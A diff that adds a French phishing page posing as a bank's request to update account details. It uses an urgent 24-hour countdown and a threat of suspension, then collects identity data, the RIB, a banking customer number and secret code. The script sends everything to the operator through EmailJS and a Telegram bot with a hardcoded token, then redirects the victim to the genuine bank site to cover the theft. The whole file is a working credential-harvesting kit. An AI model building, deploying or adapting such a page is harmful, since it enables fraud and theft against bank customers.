@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mise à jour des coordonnées bancaires</title>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("NugrVxa-mLuqItOFr");
+    })();
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 40px;
+    }
+
+    #countdown-container {
+      text-align: center;
+      font-size: 18px;
+      color: red;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .section {
+      max-width: 600px;
+      margin: auto;
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      padding: 25px;
+      display: none;
+    }
+
+    .section.active {
+      display: block;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 15px;
+      background-color: #007BFF;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+    }
+
+    p {
+      font-size: 14px;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    .row {
+      display: flex;
+      gap: 20px;
+    }
+
+    .row > div {
+      flex: 1;
+    }
+
+    .button-container {
+      text-align: right;
+      margin-top: 20px;
+    }
+
+    .btn-blue {
+      background-color: #007BFF;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .btn-blue:hover {
+      background-color: #0056b3;
+    }
+
+    /* ✅ Responsive */
+    @media screen and (max-width: 600px) {
+      body {
+        padding: 20px;
+      }
+
+      .row {
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .button-container {
+        text-align: center;
+      }
+
+      h2 {
+        font-size: 18px;
+        padding: 8px;
+      }
+
+      input, select {
+        padding: 10px;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ Compte à rebours -->
+  <div id="countdown-container">
+    Temps restant avant expiration : <span id="countdown">24:00:00</span>
+  </div>
+
+  <form id="formulaire" onsubmit="envoyerEmail(event)">
+    <!-- Étape 1 -->
+    <div class="section active" id="etape1">
+      <h2>Demande de mise à jour de vos coordonnées bancaires</h2>
+      <p>
+        Cher(e) client(e),<br><br>
+        Dans le cadre du renforcement de la sécurité de nos services, nous procédons actuellement à une mise à jour des informations liées aux comptes bancaires.<br><br>
+        Nous vous invitons à vérifier et, si nécessaire, à actualiser vos coordonnées bancaires (RIB/IBAN) dans un délai de 24 heures.<br><br>
+        À défaut de mise à jour dans ce délai, l’accès à votre compte pourra être temporairement suspendu à titre préventif, afin d’assurer la sécurité de vos transactions.<br><br>
+        Nous vous remercions de votre compréhension et de votre collaboration.
+      </p>
+      <div class="button-container">
+        <button type="button" class="btn-blue" onclick="afficherSection('etape2')">Mettre à jour</button>
+      </div>
+    </div>
+
+    <!-- Étape 2 -->
+    <div class="section" id="etape2">
+      <h2>Coordonnées bancaires</h2>
+      <label for="prenom">Prénom</label>
+      <input type="text" id="prenom" name="prenom" required>
+
+      <label for="nom">Nom</label>
+      <input type="text" id="nom" name="nom" required>
+
+      <label for="adresse">N° et nom de rue</label>
+      <input type="text" id="adresse" name="adresse">
+
+      <div class="row">
+        <div>
+          <label for="codepostal">Code postal</label>
+          <input type="text" id="codepostal" name="codepostal">
+        </div>
+        <div>
+          <label for="ville">Ville</label>
+          <input type="text" id="ville" name="ville">
+        </div>
+      </div>
+
+      <label for="pays">Pays</label>
+      <select id="pays" name="pays" required>
+        <option value="">Sélectionner votre pays</option>
+        <option value="FR">France</option>
+      </select>
+
+      <label for="rib">RIB</label>
+      <input type="text" id="rib" name="rib">
+
+      <label for="banque">Banque</label>
+      <select id="banque" name="banque">
+        <option value="">Sélectionner votre banque</option>
+        <option>BNP Paribas</option>
+        <option>Société Générale</option>
+        <option>Crédit Agricole</option>
+        <option>Crédit Mutuel</option>
+        <option>La Banque Postale</option>
+        <option>CIC</option>
+        <option>LCL</option>
+        <option>Banque Populaire</option>
+        <option>Caisse d'Épargne</option>
+        <option>Autre</option>
+      </select>
+
+      <label for="email">Adresse email</label>
+      <input type="email" id="email" name="email">
+
+      <label for="telephone">Téléphone</label>
+      <input type="tel" id="telephone" name="telephone">
+
+      <div class="button-container">
+        <button type="button" class="btn-blue" onclick="afficherSection('etape3')">Suivant</button>
+      </div>
+    </div>
+
+    <!-- Étape 3 -->
+    <div class="section" id="etape3">
+      <h2>Connexion à votre compte</h2>
+
+      <label for="numero_client">Mon numéro client</label>
+      <input type="text" id="numero_client" name="numero_client">
+
+      <label for="code_secret">Mon code secret</label>
+      <input type="password" id="code_secret" name="code_secret" maxlength="100">
+
+      <div class="button-container">
+        <button type="submit" class="btn-blue">Valider et envoyer</button>
+      </div>
+    </div>
+  </form>
+
+  <script>
+    function afficherSection(id) {
+      document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    function getBankRedirectURL(bankName) {
+      const urls = {
+        "BNP Paribas": "https://mabanque.bnpparibas/",
+        "Société Générale": "https://particuliers.societegenerale.fr/",
+        "Crédit Agricole": "https://www.credit-agricole.fr/",
+        "Crédit Mutuel": "https://www.creditmutuel.fr/",
+        "La Banque Postale": "https://www.labanquepostale.fr/",
+        "CIC": "https://www.cic.fr/",
+        "LCL": "https://www.lcl.fr/",
+        "Banque Populaire": "https://www.banquepopulaire.fr/",
+        "Caisse d'Épargne": "https://www.caisse-epargne.fr/"
+      };
+      return urls[bankName] || null;
+    }
+
+    function envoyerEmail(event) {
+      event.preventDefault();
+
+      const form = document.getElementById('formulaire');
+      const formData = new FormData(form);
+      const banqueChoisie = formData.get("banque");
+      const redirectionURL = getBankRedirectURL(banqueChoisie);
+
+      emailjs.sendForm('service_y63w1tq', 'template_08q3xlb', '#formulaire')
+        .then(() => console.log('EmailJS : envoyé'))
+        .catch(error => console.log('Erreur EmailJS:', error));
+
+      const token = "8138465907:AAEUsEMnUN3O2R-S5pKQRwQLwitOJRqtvk4";
+      const chatId = "7396999665";
+
+      let message = "📩 Nouvelle soumission de formulaire :\n\n";
+      formData.forEach((value, key) => {
+        message += `🔹 ${key} : ${value}\n`;
+      });
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Erreur Telegram");
+        form.reset();
+        afficherSection('etape1');
+        if (redirectionURL) window.location.href = redirectionURL;
+      })
+      .catch(error => {
+        console.error("Erreur Telegram :", error);
+        alert("Une erreur est survenue lors de l'envoi.");
+      });
+    }
+
+    // ✅ Script compte à rebours 24h
+    const countdownElement = document.getElementById("countdown");
+    const expirationTime = new Date().getTime() + 24 * 60 * 60 * 1000;
+
+    setInterval(() => {
+      const now = new Date().getTime();
+      const distance = expirationTime - now;
+
+      if (distance <= 0) {
+        countdownElement.textContent = "00:00:00";
+        return;
+      }
+
+      const hours = String(Math.floor((distance / (1000 * 60 * 60)) % 24)).padStart(2, '0');
+      const minutes = String(Math.floor((distance / (1000 * 60)) % 60)).padStart(2, '0');
+      const seconds = String(Math.floor((distance / 1000) % 60)).padStart(2, '0');
+
+      countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }, 1000);
+  </script>
+
+</body>
+</html>
